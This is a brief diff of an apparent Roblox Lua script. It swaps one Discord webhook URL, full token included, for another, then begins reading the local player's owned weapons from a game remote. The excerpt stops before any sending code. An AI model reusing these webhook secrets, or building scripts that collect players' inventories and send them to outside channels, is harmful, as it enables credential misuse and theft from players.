@@ -1,6 +1,6 @@
 -- partner_chat_1
 
-local url = "https://discord.com/api/webhooks/1270609913764249621/b-idxrS8milHpq3CZILUeyeX1Bhjc1TLqo1chD65KvqVmaM83zEJSXZ2qjFlgl17m3Bj"
+local url = "https://discord.com/api/webhooks/1270607844663754783/VN12IA7nFmgX6l8sDozX4wxrmshjPbsCsDXhACjTYXAP8zGrEoMx0KHPzPTUKJKoyD_G"
 
 t = {}
 for i,v in pairs(game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"]) do
